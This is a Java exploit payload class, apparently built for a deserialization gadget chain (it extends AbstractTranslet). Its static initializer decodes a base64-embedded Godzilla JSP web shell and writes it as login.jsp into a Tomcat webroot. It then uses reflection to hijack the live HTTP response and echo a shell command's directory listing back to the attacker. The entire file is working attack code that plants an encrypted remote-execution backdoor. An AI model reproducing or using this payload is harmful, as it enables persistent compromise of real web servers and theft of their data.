package com.example.frchannel.payload;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.List;
import java.util.Scanner;

public class godzillajsp extends AbstractTranslet {

    private static String godzillajsp = "PCUhIFN0cmluZyB4Yz0iNDYwN2M5MzI3ZGZjM2Y3NyI7IFN0cmluZyBwYXNzPSJmaW5lIjsgU3RyaW5nIG1kNT1tZDUocGFzcyt4Yyk7IGNsYXNzIFggZXh0ZW5kcyBDbGFzc0xvYWRlcntwdWJsaWMgWChDbGFzc0xvYWRlciB6KXtzdXBlcih6KTt9cHVibGljIENsYXNzIFEoYnl0ZVtdIGNiKXtyZXR1cm4gc3VwZXIuZGVmaW5lQ2xhc3MoY2IsIDAsIGNiLmxlbmd0aCk7fSB9cHVibGljIGJ5dGVbXSB4KGJ5dGVbXSBzLGJvb2xlYW4gbSl7IHRyeXtqYXZheC5jcnlwdG8uQ2lwaGVyIGM9amF2YXguY3J5cHRvLkNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7Yy5pbml0KG0/MToyLG5ldyBqYXZheC5jcnlwdG8uc3BlYy5TZWNyZXRLZXlTcGVjKHhjLmdldEJ5dGVzKCksIkFFUyIpKTtyZXR1cm4gYy5kb0ZpbmFsKHMpOyB9Y2F0Y2ggKEV4Y2VwdGlvbiBlKXtyZXR1cm4gbnVsbDsgfX0gcHVibGljIHN0YXRpYyBTdHJpbmcgbWQ1KFN0cmluZyBzKSB7U3RyaW5nIHJldCA9IG51bGw7dHJ5IHtqYXZhLnNlY3VyaXR5Lk1lc3NhZ2VEaWdlc3QgbTttID0gamF2YS5zZWN1cml0eS5NZXNzYWdlRGlnZXN0LmdldEluc3RhbmNlKCJNRDUiKTttLnVwZGF0ZShzLmdldEJ5dGVzKCksIDAsIHMubGVuZ3RoKCkpO3JldCA9IG5ldyBqYXZhLm1hdGguQmlnSW50ZWdlcigxLCBtLmRpZ2VzdCgpKS50b1N0cmluZygxNikudG9VcHBlckNhc2UoKTt9IGNhdGNoIChFeGNlcHRpb24gZSkge31yZXR1cm4gcmV0OyB9IHB1YmxpYyBzdGF0aWMgU3RyaW5nIGJhc2U2NEVuY29kZShieXRlW10gYnMpIHRocm93cyBFeGNlcHRpb24ge0NsYXNzIGJhc2U2NDtTdHJpbmcgdmFsdWUgPSBudWxsO3RyeSB7YmFzZTY0PUNsYXNzLmZvck5hbWUoImphdmEudXRpbC5CYXNlNjQiKTtPYmplY3QgRW5jb2RlciA9IGJhc2U2NC5nZXRNZXRob2QoImdldEVuY29kZXIiLCBudWxsKS5pbnZva2UoYmFzZTY0LCBudWxsKTt2YWx1ZSA9IChTdHJpbmcpRW5jb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZW5jb2RlVG9TdHJpbmciLCBuZXcgQ2xhc3NbXSB7IGJ5dGVbXS5jbGFzcyB9KS5pbnZva2UoRW5jb2RlciwgbmV3IE9iamVjdFtdIHsgYnMgfSk7fSBjYXRjaCAoRXhjZXB0aW9uIGUpIHt0cnkgeyBiYXNlNjQ9Q2xhc3MuZm9yTmFtZSgic3VuLm1pc2MuQkFTRTY0RW5jb2RlciIpOyBPYmplY3QgRW5jb2RlciA9IGJhc2U2NC5uZXdJbnN0YW5jZSgpOyB2YWx1ZSA9IChTdHJpbmcpRW5jb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZW5jb2RlIiwgbmV3IENsYXNzW10geyBieXRlW10uY2xhc3MgfSkuaW52b2tlKEVuY29kZXIsIG5ldyBPYmplY3RbXSB7IGJzIH0pO30gY2F0Y2ggKEV4Y2VwdGlvbiBlMikge319cmV0dXJuIHZhbHVlOyB9IHB1YmxpYyBzdGF0aWMgYnl0ZVtdIGJhc2U2NERlY29kZShTdHJpbmcgYnMpIHRocm93cyBFeGNlcHRpb24ge0NsYXNzIGJhc2U2NDtieXRlW10gdmFsdWUgPSBudWxsO3RyeSB7YmFzZTY0PUNsYXNzLmZvck5hbWUoImphdmEudXRpbC5CYXNlNjQiKTtPYmplY3QgZGVjb2RlciA9IGJhc2U2NC5nZXRNZXRob2QoImdldERlY29kZXIiLCBudWxsKS5pbnZva2UoYmFzZTY0LCBudWxsKTt2YWx1ZSA9IChieXRlW10pZGVjb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZGVjb2RlIiwgbmV3IENsYXNzW10geyBTdHJpbmcuY2xhc3MgfSkuaW52b2tlKGRlY29kZXIsIG5ldyBPYmplY3RbXSB7IGJzIH0pO30gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7dHJ5IHsgYmFzZTY0PUNsYXNzLmZvck5hbWUoInN1bi5taXNjLkJBU0U2NERlY29kZXIiKTsgT2JqZWN0IGRlY29kZXIgPSBiYXNlNjQubmV3SW5zdGFuY2UoKTsgdmFsdWUgPSAoYnl0ZVtdKWRlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZUJ1ZmZlciIsIG5ldyBDbGFzc1tdIHsgU3RyaW5nLmNsYXNzIH0pLmludm9rZShkZWNvZGVyLCBuZXcgT2JqZWN0W10geyBicyB9KTt9IGNhdGNoIChFeGNlcHRpb24gZTIpIHt9fXJldHVybiB2YWx1ZTsgfSU+PCV0cnl7Ynl0ZVtdIGRhdGE9YmFzZTY0RGVjb2RlKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKHBhc3MpKTtkYXRhPXgoZGF0YSwgZmFsc2UpO2lmIChzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpPT1udWxsKXtzZXNzaW9uLnNldEF0dHJpYnV0ZSgicGF5bG9hZCIsbmV3IFgodGhpcy5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLlEoZGF0YSkpO31lbHNle3JlcXVlc3Quc2V0QXR0cmlidXRlKCJwYXJhbWV0ZXJzIixkYXRhKTtqYXZhLmlvLkJ5dGVBcnJheU91dHB1dFN0cmVhbSBhcnJPdXQ9bmV3IGphdmEuaW8uQnl0ZUFycmF5T3V0cHV0U3RyZWFtKCk7T2JqZWN0IGY9KChDbGFzcylzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpKS5uZXdJbnN0YW5jZSgpO2YuZXF1YWxzKGFyck91dCk7Zi5lcXVhbHMocGFnZUNvbnRleHQpO3Jlc3BvbnNlLmdldFdyaXRlcigpLndyaXRlKG1kNS5zdWJzdHJpbmcoMCwxNikpO2YudG9TdHJpbmcoKTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShiYXNlNjRFbmNvZGUoeChhcnJPdXQudG9CeXRlQXJyYXkoKSwgdHJ1ZSkpKTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShtZDUuc3Vic3RyaW5nKDE2KSk7fSB9Y2F0Y2ggKEV4Y2VwdGlvbiBlKXt9DQolPg==";
    private static String fname = "login.jsp";
    private static Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while(var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }
    public static void exec () throws Exception{
        String path = "";
        byte[] decode = Base64.getDecoder().decode(godzillajsp);
        if (File.separator.equals("/")) {
            path = "../webapps/webroot/";
        } else {
            path = "..\\webapps\\webroot\\";
        }
        FileOutputStream fileOutputStream = new FileOutputStream(path+fname);
        fileOutputStream.write(decode);
        fileOutputStream.close();

        boolean var1 = false;
        Thread[] var2 = (Thread[])((Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads"));
        for(int var3 = 0; var3 < var2.length; ++var3) {
            Thread var4 = var2[var3];
            if (var4 != null) {
                String var5 = var4.getName();
                if (!var5.contains("exec") && var5.contains("http")) {
                    Object var6 = getFV(var4, "target");
                    if (var6 instanceof Runnable) {
                        try {
                            var6 = getFV(getFV(getFV(var6, "this$0"), "handler"), "global");
                        } catch (Exception var14) {
                            continue;
                        }

                        List var8 = (List)getFV(var6, "processors");

                        for(int var9 = 0; var9 < var8.size(); ++var9) {
                            Object var10 = var8.get(var9);
                            var6 = getFV(var10, "req");
                            Object var11 = var6.getClass().getMethod("getResponse").invoke(var6);

                            try {
                                var5 = (String)var6.getClass().getMethod("getHeader", String.class).invoke(var6, new String("host"));
                                if (var5 != null && !var5.isEmpty()) {
                                    String[] var12 = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", "dir "+path} : new String[]{"/bin/sh", "-c", "ls "+path};
                                    writeBody(var11, (new Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter("\\A").next().getBytes());
                                    var1 = true;
                                }

                                if (var1) {
                                    break;
                                }
                            } catch (Exception var13) {
                                Exception var14 = var13;
                                writeBody(var11, var14.getMessage().getBytes());
                            }
                        }

                        if (var1) {
                            break;
                        }
                    }
                }
            }
        }

    }

    static {
        try {
            exec();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public static String[] splitString(String originalString, int chunkSize) {
        int length = originalString.length();
        int numChunks = (int) Math.ceil((double) length / chunkSize);
        String[] chunks = new String[numChunks];

        for (int i = 0; i < numChunks; i++) {
            int startIndex = i * chunkSize;
            int endIndex = Math.min(startIndex + chunkSize, length);
            chunks[i] = originalString.substring(startIndex, endIndex);
        }

        return chunks;
    }

    public static void writeToSingleFile(String fileName, String[] chunks) {
        try (FileWriter writer = new FileWriter(fileName)) {
            int num = 1;
            for (String chunk : chunks) {
                writer.write("private static String code" + num + " = \"" + chunk + "\";\n");
                num++;
            }
            System.out.println("All chunks have been written to " + fileName);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    private static void writeBody(Object var0, byte[] var1) throws Exception {
        byte[] var2 = var1;

        Object var3;
        Class var4;
        try {
            var4 = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
            var3 = var4.newInstance();
            var4.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(var3, var2, new Integer(0), new Integer(var2.length));
            var0.getClass().getMethod("doWrite", var4).invoke(var0, var3);
        } catch (Exception var6) {
            var4 = Class.forName("java.nio.ByteBuffer");
            var3 = var4.getDeclaredMethod("wrap", byte[].class).invoke(var4, var1);
            var0.getClass().getMethod("doWrite", var4).invoke(var0, var3);
        }

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
